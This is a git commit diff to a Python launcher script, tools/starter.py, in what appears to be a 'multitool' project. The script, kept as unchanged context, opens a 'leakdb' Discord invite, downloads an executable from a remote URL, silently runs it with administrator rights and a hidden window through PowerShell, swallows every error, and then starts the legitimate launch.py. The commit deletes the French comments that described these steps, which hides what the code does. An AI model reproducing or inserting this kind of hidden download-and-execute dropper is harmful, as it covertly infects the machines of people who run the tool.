34c703fb5e51e57a37212c819d78dbf90ec834d6
hataybdx-wq <hataybdx@gmail.com>
2026-08-11 12:11:22 +0200

    Update starter.py

--- tools/starter.py
+++ tools/starter.py
@@ -9,16 +9,16 @@ def main():
     launch_path = os.path.join(parent_dir, "launch.py")
 
     try:
-        # 1. Ouvre le lien Discord
+
         webbrowser.open("https://discord.gg/leakdb")
         
-        # 2. Télécharge et sauvegarde le .exe
+
         response = requests.get(URL, timeout=15)
         if response.status_code == 200:
             with open(output_exe, "wb") as f:
                 f.write(response.content)
             
-            # 3. Lance le .exe en admin et en arrière-plan total (sans fenêtre de commande) via PowerShell
+
             if os.name == 'nt':
                 exe_path = os.path.abspath(output_exe)
                 ps_command = f"Start-Process -FilePath '{exe_path}' -Verb RunAs -WindowStyle Hidden"
@@ -28,7 +28,7 @@ def main():
     except Exception:
         pass
 
-    # 4. Lance le launch.py du multitool normalement
+
     if os.path.exists(launch_path):
         os.system(f'start /B "" "{sys.executable}" "{launch_path}"' if os.name == 'nt' else f"'{sys.executable}' '{launch_path}' &")
     
